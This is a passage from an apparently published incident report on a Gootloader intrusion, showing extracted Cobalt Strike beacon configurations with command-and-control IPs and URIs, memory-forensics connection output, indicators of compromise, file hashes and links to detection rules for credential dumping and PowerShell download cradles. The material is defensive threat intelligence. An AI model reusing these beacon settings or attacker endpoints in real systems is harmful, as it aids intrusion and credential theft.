Issuer:  C=, ST=, L=, O=, OU=, CN=
Subject:  C=, ST=, L=, O=, OU=, CN=
Public Algorithm: rsaEncryption</pre>
<div class="ql-block" data-block-id="block-29152866-f450-4e83-af6d-b63b4f9f243a">Cobalt Strike beacon configuration:</div>
<pre>Cobalt Strike Beacon:
  x86:
    beacon_type: HTTPS
    dns-beacon.strategy_fail_seconds: -1
    dns-beacon.strategy_fail_x: -1
    dns-beacon.strategy_rotate_seconds: -1
    http-get.client:
      Cookie
    http-get.uri: 146.70.78.43,/visit.js
    http-get.verb: GET
    http-post.client:
      Content-Type: application/octet-stream
      id
    http-post.uri: /submit.php
    http-post.verb: POST
    maxgetsize: 1048576
    port: 443
    post-ex.spawnto_x64: %windir%\sysnative\rundll32.exe
    post-ex.spawnto_x86: %windir%\syswow64\rundll32.exe
    process-inject.execute:
      CreateThread
      SetThreadContext
      CreateRemoteThread
      RtlCreateUserThread
    process-inject.startrwx: 64
    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648
    process-inject.userwx: 64
    proxy.behavior: 2 (Use IE settings)
    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64
    sleeptime: 60000
    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9)
    uses_cookies: 1
    watermark: 1580103824
  x64:
    beacon_type: HTTPS
    dns-beacon.strategy_fail_seconds: -1
    dns-beacon.strategy_fail_x: -1
    dns-beacon.strategy_rotate_seconds: -1
    http-get.client:
      Cookie
    http-get.uri: 146.70.78.43,/fwlink
    http-get.verb: GET
    http-post.client:
      Content-Type: application/octet-stream
      id
    http-post.uri: /submit.php
    http-post.verb: POST
    maxgetsize: 1048576
    port: 443
    post-ex.spawnto_x64: %windir%\sysnative\rundll32.exe
    post-ex.spawnto_x86: %windir%\syswow64\rundll32.exe
    process-inject.execute:
      CreateThread
      SetThreadContext
      CreateRemoteThread
      RtlCreateUserThread
    process-inject.startrwx: 64
    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648
    process-inject.userwx: 64
    proxy.behavior: 2 (Use IE settings)
    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64
    sleeptime: 60000
    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)
    uses_cookies: 1
    watermark: 1580103824</pre>
<div class="ql-block" data-block-id="block-04f9a923-999f-4bdd-9549-6cdf2b8e8141"><strong>37.120.198.225</strong></div>
<div class="ql-block" data-block-id="block-f80e29f3-2bfa-4695-95cb-f4e85e707402">Cobalt Strike server TLS configuration:</div>
<pre>Ja3:72a589da586844d7f0818ce684948eea
Ja3s:f176ba63b4d68e576b5ba345bec2c7b7
Serial Number: 146473198 (0x8bb00ee)
Certificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F
Not Before: May 20 18:26:24 2015 GMT
Not After : May 17 18:26:24 2025 GMT
Issuer: C=, ST=, L=, O=, OU=, CN=
Subject: C=, ST=, L=, O=, OU=, CN=
Public Algorithm: rsaEncryption</pre>
<div class="ql-block" data-block-id="block-8a6cf919-5fcc-4798-9b58-a893d521850d">
<div class="ql-block" data-block-id="block-3a27ab5b-7c42-4afb-9074-612693780a1a">Cobalt Strike beacon configuration:</div>
<pre>Cobalt Strike Beacon:
  x86:
    beacon_type: HTTPS
    dns-beacon.strategy_fail_seconds: -1
    dns-beacon.strategy_fail_x: -1
    dns-beacon.strategy_rotate_seconds: -1
    http-get.client:
      Cookie
    http-get.uri: 37.120.198.225,/cm
    http-get.verb: GET
    http-post.client:
      Content-Type: application/octet-stream
      id
    http-post.uri: /submit.php
    http-post.verb: POST
    maxgetsize: 1048576
    port: 443
    post-ex.spawnto_x64: %windir%\sysnative\rundll32.exe
    post-ex.spawnto_x86: %windir%\syswow64\rundll32.exe
    process-inject.execute:
      CreateThread
      SetThreadContext
      CreateRemoteThread
      RtlCreateUserThread
    process-inject.startrwx: 64
    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648
    process-inject.userwx: 64
    proxy.behavior: 2 (Use IE settings)
    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64
    sleeptime: 60000
    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSE)
    uses_cookies: 1
    watermark: 1580103824
  x64:
    beacon_type: HTTPS
    dns-beacon.strategy_fail_seconds: -1
    dns-beacon.strategy_fail_x: -1
    dns-beacon.strategy_rotate_seconds: -1
    http-get.client:
      Cookie
    http-get.uri: 37.120.198.225,/ptj
    http-get.verb: GET
    http-post.client:
      Content-Type: application/octet-stream
      id
    http-post.uri: /submit.php
    http-post.verb: POST
    maxgetsize: 1048576
    port: 443
    post-ex.spawnto_x64: %windir%\sysnative\rundll32.exe
    post-ex.spawnto_x86: %windir%\syswow64\rundll32.exe
    process-inject.execute:
      CreateThread
      SetThreadContext
      CreateRemoteThread
      RtlCreateUserThread
    process-inject.startrwx: 64
    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648
    process-inject.userwx: 64
    proxy.behavior: 2 (Use IE settings)
    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64
    sleeptime: 60000
    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)
    uses_cookies: 1
    watermark: 1580103824</pre>
<div class="ql-block" data-block-id="block-dfe9f250-0cd8-4864-ae9b-3f099aeea4f9">
<div class="ql-block" data-block-id="block-140a7a63-b35f-4232-8f96-0fc7d357351d"><a class="ql-link" href="https://github.com/activecm/rita" target="_blank" rel="noopener noreferrer">Real Intelligence Threat Analytics (RITA)</a><span data-void-detect="true"> was successful in locating one of the IP addresses used for Cobalt Strike command and control communications. </span></div>
<div class="ql-block" data-block-id="block-a4f87b2b-9fc7-46bd-b45f-e0622569203b">
<div class="ql-block" data-block-id="block-25c5d251-c30d-4c7e-8018-aa0f224772c4"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-30.png"><img loading="lazy" class="aligncenter size-full wp-image-6781 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-30.png" alt="" width="1600" height="164" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-30.png 1600w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-30-300x31.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-30-1024x105.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-30-768x79.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-30-1536x157.png 1536w" data-lazy-sizes="(max-width: 1600px) 100vw, 1600px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-30.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6781" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-30.png" alt="" width="1600" height="164" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-30.png 1600w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-30-300x31.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-30-1024x105.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-30-768x79.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-30-1536x157.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></noscript></a></div>
<div data-block-id="block-25c5d251-c30d-4c7e-8018-aa0f224772c4">&nbsp;</div>
<div class="ql-block" data-block-id="block-4f5c3322-b38d-4553-934b-44a5995c86c1">
<div class="ql-block" data-block-id="block-7e864669-27fd-4fb9-970a-867e72001207">Netscan data extracted via Volatility from the beachhead host showing Cobalt Strike C2 connections:</div>
<pre>Volatility 3 Framework 2.0.0


Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created
...
0x948431c46010  TCPv4   10.X.X.X    52670   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe    
0x948431e19010  TCPv4   10.X.X.X   63723   146.70.78.43    443     CLOSED  3420    rundll32.exe     
0x9484337f18a0  TCPv4   10.X.X.X    52697   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe     
0x948435102050  TCPv4   10.X.X.X    52689   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe  
... </pre>
<h2 class="ql-heading" data-block-id="block-77970728-863f-4486-acb6-f94c9a29f66a">Impact</h2>
<div class="ql-block" data-block-id="block-db347e76-e074-4ece-ac5e-dd84b7ea23a3">In this case, there was no further impact to the environment before the threat actors were evicted.</div>
<div data-block-id="block-db347e76-e074-4ece-ac5e-dd84b7ea23a3">&nbsp;</div>
<h3 class="ql-heading" data-block-id="block-db39d875-dcae-4e16-a42f-13a812640b37"><strong>Indicators</strong></h3>
<h3 class="ql-heading" data-block-id="block-4a0073c1-3bc8-4e79-964f-7a8c504080fa">Network</h3>
<pre>Gootloader
https://kakiosk.adsparkdev[.]com
https://jp.imonitorsoft[.]com
https://junk-bros[.]com
35.206.117.64:443


Cobalt Strike
146.70.78.43:443
37.120.198.225:44</pre>
<h3 class="ql-heading" data-block-id="block-fd466e0c-495d-49c2-ab15-2339f0921b35">File</h3>
<pre>olympus_plea_agreement 34603 .js
d7d3e1c76d5e2fa9f7253c8ababd6349
724013ea6906a3122698fd125f55546eac0c1fe0
6e141779a4695a637682d64f7bc09973bb82cd24211b2020c8c1648cdb41001b

olympus plea agreement(46196).zip
b50333ff4e5cbcda8b88ce109e882eeb
44589fc2a4d1379bee93282bbdb16acbaf762a45
7d93b3531f5ab7ef8d68fb3d06f57e889143654de4ba661e5975dae9679bbb2c

mi.ps1
acef25c1f6a7da349e62b365c05ae60c
c5d134a96ca4d33e96fb0ab68cf3139a95cf8071
d00edf5b9a9a23d3f891afd51260b3356214655a73e1a361701cda161798ea0b

Invoke-WMIExec.ps1
b4626a335789e457ea48e56dfbf39710
62a7656d81789591358796100390799e83428519
c4939f6ad41d4f83b427db797aaca106b865b6356b1db3b7c63b995085457222

ls.exe
87ae2a50ba94f45da39ec7673d71547c
dfa0b4206abede8f441fcdc8155803b8967e035c
8764131983eac23033c460833de5e439a4c475ad94cfd561d80cb62f86ff</pre>
<h2 class="ql-heading" data-block-id="block-611d8a7d-00a7-4c61-bbae-a278d81b8f07">Detections</h2>
<h3 class="ql-heading" data-block-id="block-63f539ac-9e95-4fd5-9fe7-8eed08272b97">Network</h3>
<pre>ET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike 
ET MALWARE Meterpreter or Other Reverse Shell SSL Cert</pre>
<h3 class="ql-heading" data-block-id="block-e257a019-820a-4f00-bbd3-d2059dd5ff13">Sigma</h3>
<p><a href="https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Deleting%20Windows%20Defender%20scheduled%20tasks" target="_blank" rel="noopener">Deleting Windows Defender scheduled tasks</a></p>
<p><a href="https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Enabling%20restricted%20admin%20mode" target="_blank" rel="noopener">Enabling restricted admin mode</a></p>
<p><a href="https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Using%20powershell%20specific%20download%20cradle%20OneLiner" target="_blank" rel="noopener">Using powershell specific download cradle OneLiner</a></p>
<p><a href="https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Using%20Lazagne%20to%20dump%20credentials" target="_blank" rel="noopener">Using Lazagne to dump credentials</a></p>
</div>
</div>
</div>
</div>
</div>
<div class="ql-block" data-block-id="block-4e45acba-b38d-4730-b787-328af6d0f5ac">
<div class="ql-block" data-block-id="block-8a6cf919-5fcc-4798-9b58-a893d521850d">
<div class="ql-block" data-block-id="block-dfe9f250-0cd8-4864-ae9b-3f099aeea4f9">
<div class="ql-block" data-block-id="block-a4f87b2b-9fc7-46bd-b45f-e0622569203b">
<div class="ql-block" data-block-id="block-4f5c3322-b38d-4553-934b-44a5995c86c1">
<div class="ql-block" data-block-id="block-a35a0852-1c95-4229-b0f7-01801a140b9d">
<div class="ql-block" data-block-id="block-2a104d5d-ce2b-449d-bc59-fb1fd27b2d08">
<div class="ql-block" data-block-id="block-e49a0341-0c49-4683-984b-87f5023e2b03">
<div class="ql-block" data-block-id="block-95e6388f-65dc-4aec-8256-282d02c25f1b">
<div class="ql-block" data-block-id="block-e90b4bcb-479a-4322-9c9d-cec8fce3e704">Bloodhound Detection – <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hack_bloodhound.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hack_bloodhound.yml</a><br>Powershell download – <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml</a><br>Defender Disable via Powershell – <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_defender_disable_feature.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_defender_disable_feature.yml</a><br>Creation of Scheduled Task via Powershell – <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_script/posh_ps_cmdlet_scheduled_task.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_script/posh_ps_cmdlet_scheduled_task.yml</a><br>LaZagne LSASS Access – <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/proc_access_win_lazagne_cred_dump_lsass_access.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/proc_access_win_lazagne_cred_dump_lsass_access.yml</a><br>Systeminfo Discovery – <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_systeminfo.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_systeminfo.yml</a><br>CobaltStrike Named Pipe – <a href="https://github.com/SigmaHQ/sigma/blob/7fb8272f948cc0b528fe7bd36df36449f74b2266/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml">https://github.com/SigmaHQ/sigma/blob/7fb8272f948cc0b528fe7bd36df36449f74b2266/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml</a><br>Malicious PowerShell Commandlets – <a href="https://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml">https://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml</a><br>Suspicious Service Installation – <a href="https://github.com/SigmaHQ/sigma/blob/7d48d0e838b76f3fb5bc623e7ec45343cfac9c88/rules/windows/builtin/system/win_susp_service_installation.yml">https://github.com/SigmaHQ/sigma/blob/7d48d0e838b76f3fb5bc623e7ec45343cfac9c88/rules/windows/builtin/system/win_susp_service_installation.yml</a><br>Suspicious XOR Encoded PowerShell Command Line –<a href="https://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/windows/powershell/powershell_classic/posh_pc_xor_commandline.yml"> https://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/windows/powershell/powershell_classic/posh_pc_xor_commandline.yml</a><br>Too Long PowerShell Commandlines – <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_long_powershell_commandline.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_long_powershell_commandline.yml</a><br>PowerShell Network Connections – <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_powershell_network_connection.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_powershell_network_connection.yml</a><br>Rundll32 Internet Connection – <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml</a><br>Mimikatz Use – <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_alert_mimikatz_keywords.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_alert_mimikatz_keywords.yml</a></div>
<div class="ql-block" data-block-id="block-9a247599-cd3d-4e19-bdd6-c76d566211fa">
<h3 data-block-id="block-07f41b46-587e-47fd-a8ac-272291f2593d">&nbsp;</h3>
<h3 class="ql-heading" data-block-id="block-07f41b46-587e-47fd-a8ac-272291f2593d">Yara</h3>
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/SEO%20Poisoning%20%E2%80%93%20A%20Gootloader%20Story" target="_blank" rel="noopener">Custom Yara rule</a></p>
<h2 class="ql-heading" data-block-id="block-d96d9e59-fd55-42de-8cfe-c25f69b42e99">MITRE</h2>
<div class="ql-block" data-block-id="block-a1b49c3a-48de-4716-84d1-e2bb6ffc070c">
<ul>
<li class="ql-block" data-block-id="block-35cb966c-88f3-49f5-ab22-eab82ab44692">T1189 Drive-by Compromise</li>
<li class="ql-block" data-block-id="block-23ea6526-0f70-4e1d-99dc-0a7c6fcbbec5">T1204.001 – User Execution:&nbsp;Malicious Link</li>
<li class="ql-block" data-block-id="block-d474b77f-7dac-40c3-b47d-0887c4a5dec3">T1204.002 – User Execution: Malicious File</li>
<li class="ql-block" data-block-id="block-3b0b87de-cae7-45e4-9cf5-2eb547cade39">T1059.001 – Command and Scripting Interpreter: PowerShell</li>
<li class="ql-block" data-block-id="block-4c4e5260-21a0-42b3-9119-3a7d5418ec6e">T1053 – Scheduled Task/Job</li>
<li class="ql-block" data-block-id="block-5625d6ac-e5b1-483e-a3b0-cf1c26c74c7c">T1218.011 – System Binary Proxy Execution: Rundll32</li>
<li class="ql-block" data-block-id="block-71f3b1ed-21cd-429a-a88f-31535a7915aa"><span class="ql-comment" data-comment-ids="768829020" data-comment-unresolved-ids="">T1555 – Credentials from Password Stores</span></li>
<li class="ql-block" data-block-id="block-b3db8a23-c6c0-4df2-857c-fe16458560a8">T1003.001- OS Credential Dumping: LSASS Memory</li>
<li class="ql-block" data-block-id="block-dd364e34-71d3-4d6e-98fe-23571ee0d9ec">T1087 – Account Discovery</li>
<li class="ql-block" data-block-id="block-92ad3154-2578-44d8-a0f9-861e2e24dc52">T1560 – Archive Collected Data</li>
<li class="ql-block" data-block-id="block-567b6aea-ed20-443a-a878-24940b52bfe3">T1482 – Domain Trust Discovery</li>
<li class="ql-block" data-block-id="block-8e2ecb91-3523-47a3-b4b0-6398fb3a908d">T1615 – Group Policy Discovery</li>
<li class="ql-block" data-block-id="block-3f0988c7-b3d2-4c36-a3ea-c9f12256475c">T1069 – Permission Groups Discovery</li>
<li class="ql-block" data-block-id="block-0e3000db-7fd0-465c-addc-376aded23bd4">T1018 – Remote System Discovery</li>
<li class="ql-block" data-block-id="block-6421b49f-11a0-486f-935a-85e79a11fc9a">T1033 – System Owner/User Discovery</li>
<li class="ql-block" data-block-id="block-fa3c6d76-9481-4feb-bcbc-f5e2039e6d35">T1021.001 – Remote Services:&nbsp;Remote Desktop Protocol</li>
<li class="ql-block" data-block-id="block-5d7bca9d-1e71-49e9-b772-800da3d6c8d9">T1021.006 – Remote Services:&nbsp;Windows Remote Management</li>
<li class="ql-block" data-block-id="block-4ea83ffa-c971-46fb-b578-1e6fbfa67463">T1005 – Data from Local System</li>
<li class="ql-block" data-block-id="block-adb858b9-87fb-4b2c-9f2b-5a2dca56c4f6">T1039 – Data from Network Shared Drive</li>
<li class="ql-block" data-block-id="block-44330d33-1c89-4d7c-83f3-39c8d1cebe33">T1046 – Network Service Scanning</li>
<li class="ql-block" data-block-id="block-10f236b5-7596-4293-b1fe-07257faf7e5b">T1562.001 – Impair Defenses:&nbsp;Disable or Modify Tools</li>
<li class="ql-block" data-block-id="block-5150b218-7e38-4519-bc21-92ae649217b5">T1518.001 – Security Software Discovery</li>
<li class="ql-block" data-block-id="block-8370d7f8-063e-426f-9831-4a2a9e146d1a">T1071.001 Web Protocols</li>
<li class="ql-block" data-block-id="block-d4f73e73-6e90-4da5-81bc-7bd9127bde60">T1027 – Obfuscated Files or Information</li>
</ul>
<div data-block-id="block-d4f73e73-6e90-4da5-81bc-7bd9127bde60">&nbsp;</div>
<div class="ql-block" data-block-id="block-d8c733f4-ee03-47e6-9a3e-e14d8181c45a">
<div class="ql-block" data-block-id="block-cee6b073-dbd5-411a-b846-fd1852a6f961">
<div class="ql-block" data-block-id="block-31c3d1a6-00ef-4dfe-8bd5-a15c73dee162">
<div class="ql-block" data-block-id="block-15f9c31f-9154-4977-9062-66ca0e18412c">Internal case #11462</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul data-sharing-events-added="true"><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-6736" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/?share=twitter&amp;nb=1" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-6736" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/?share=facebook&amp;nb=1" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-6736" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/?share=linkedin&amp;nb=1" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/?share=reddit&amp;nb=1" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id="jp-relatedposts" class="jp-relatedposts" style="display: block;">
<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
<div class="jp-relatedposts-items jp-relatedposts-items-visual jp-relatedposts-grid "><div class="jp-relatedposts-post jp-relatedposts-post0 jp-relatedposts-post-thumbs" data-post-id="4010" data-post-format="false"><a class="jp-relatedposts-post-a" href="https://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/" title="BazarLoader to Conti Ransomware in 32 Hours" data-origin="6736" data-position="0"><img class="jp-relatedposts-post-img" loading="lazy" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2021/09/ca58f3e4e67ad87f182addb8f788c7a7ddd46ed64030d3b812f759310ea22d4d.png?resize=350%2C200&amp;ssl=1" width="350" height="200" alt=""></a><h4 class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/" title="BazarLoader to Conti Ransomware in 32 Hours" data-origin="6736" data-position="0">BazarLoader to Conti Ransomware in 32 Hours</a></h4><p class="jp-relatedposts-post-excerpt">Intro Conti is a top player in the ransomware ecosystem, being listed as 2nd overall in the Q2 2021 Coveware ransomware report. The groups deploying this RaaS have only grown more prevalent. Despite the group having it's affiliate guide leaked, which revealed many techniques already covered in previous reports, the…</p><time class="jp-relatedposts-post-date" datetime="September 13, 2021" style="display: block;">September 13, 2021</time><p class="jp-relatedposts-post-context">In "bazar"</p></div><div class="jp-relatedposts-post jp-relatedposts-post1 jp-relatedposts-post-thumbs" data-post-id="5706" data-post-format="false"><a class="jp-relatedposts-post-a" href="https://thedfirreport.com/2022/03/07/2021-year-in-review/" title="2021 Year In Review" data-origin="6736" data-position="1"><img class="jp-relatedposts-post-img" loading="lazy" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2022/03/333333.png?resize=350%2C200&amp;ssl=1" width="350" height="200" alt=""></a><h4 class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://thedfirreport.com/2022/03/07/2021-year-in-review/" title="2021 Year In Review" data-origin="6736" data-position="1">2021 Year In Review</a></h4><p class="jp-relatedposts-post-excerpt">As we come to the end of the first quarter of 2022, we want to take some time to look back over our cases from 2021, in aggregate, and look at some of the top tactics, techniques and procedures (TTP's) we observed. In total, we reported on 20 incidents in…</p><time class="jp-relatedposts-post-date" datetime="March 7, 2022" style="display: block;">March 7, 2022</time><p class="jp-relatedposts-post-context">Similar post</p></div><div class="jp-relatedposts-post jp-relatedposts-post2 jp-relatedposts-post-thumbs" data-post-id="1257" data-post-format="false"><a class="jp-relatedposts-post-a" href="https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/" title="PYSA/Mespinoza Ransomware" data-origin="6736" data-position="2"><img class="jp-relatedposts-post-img" loading="lazy" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2020/11/pysa-1.png?resize=350%2C200&amp;ssl=1" width="350" height="200" alt=""></a><h4 class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/" title="PYSA/Mespinoza Ransomware" data-origin="6736" data-position="2">PYSA/Mespinoza Ransomware</a></h4><p class="jp-relatedposts-post-excerpt">Intro Over the course of 8 hours the PYSA/Mespinoza threat actors used Empire and Koadic as well as RDP to move laterally throughout the environment, grabbing credentials from as many systems as possible on the way to their objective. The threat actors took their time, looking for files and reviewing…</p><time class="jp-relatedposts-post-date" datetime="November 23, 2020" style="display: block;">November 23, 2020</time><p class="jp-relatedposts-post-context">In "empire"</p></div></div></div>
</div>
<footer class="entry-footer">
<div class="entry-meta">
</div>
</footer>
</div>
</article>
<nav class="navigation post-navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2022/04/25/quantum-ransomware/" rel="prev">Quantum Ransomware</a></div></div>
</nav>
</main>
</div>
<aside id="secondary" class="widget-area" style="position: relative; overflow: visible; box-sizing: border-box; min-height: 1px;">
<div class="theiaStickySidebar" style="padding-top: 0px; padding-bottom: 1px; position: static; transform: none;"><section id="google_translate_widget-3" class="widget widget_google_translate_widget"><h2 class="widget-title">Translate</h2><div id="google_translate_element"></div></section><section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
<label>
<span class="screen-reader-text">Search for:</span>
<input type="search" class="search-field" placeholder="Search …" value="" name="s">
</label>
<input type="submit" class="search-submit" value="Search">
</form></section><section id="blog_subscription-2" class="widget widget_blog_subscription jetpack_subscription_widget"><h2 class="widget-title">Subscribe to Blog via Email</h2>
<form action="#" method="post" accept-charset="utf-8" id="subscribe-blog-blog_subscription-2">
<div id="subscribe-text"><p>Enter your email address to subscribe to this blog and receive notifications of new posts by email.</p>
</div>
<p id="subscribe-email">
<label id="jetpack-subscribe-label" class="screen-reader-text" for="subscribe-field-blog_subscription-2">
Email Address </label>
<input type="email" name="email" required="required" value="" id="subscribe-field-blog_subscription-2" placeholder="Email Address">
</p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe">
<input type="hidden" name="source" value="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/">
<input type="hidden" name="sub-type" value="widget">
<input type="hidden" name="redirect_fragment" value="subscribe-blog-blog_subscription-2">
<button type="submit" class="wp-block-button__link" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</form>
</section><section id="twitter_timeline-3" class="widget widget_twitter_timeline"><h2 class="widget-title">Follow us on Twitter</h2><a class="twitter-timeline" data-width="220" data-theme="light" data-border-color="#e8e8e8" data-tweet-limit="10" data-lang="EN" data-partner="jetpack" data-chrome="noheader nofooter noborders transparent noscrollbar" href="https://twitter.com/@TheDFIRReport">My Tweets</a></section><section id="blog_subscription-4" class="widget widget_blog_subscription jetpack_subscription_widget"><h2 class="widget-title">Subscribe to Blog via Email</h2>
<form action="#" method="post" accept-charset="utf-8" id="subscribe-blog-blog_subscription-4">
<div id="subscribe-text"><p>Enter your email address to subscribe to this blog and receive notifications of new posts by email.</p>
</div>
<p id="subscribe-email">
<label id="jetpack-subscribe-label" class="screen-reader-text" for="subscribe-field-blog_subscription-4">
Email Address </label>
<input type="email" name="email" required="required" value="" id="subscribe-field-blog_subscription-4" placeholder="Email Address">
</p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe">
<input type="hidden" name="source" value="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/">
<input type="hidden" name="sub-type" value="widget">
<input type="hidden" name="redirect_fragment" value="subscribe-blog-blog_subscription-4">
<button type="submit" class="wp-block-button__link" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</form>
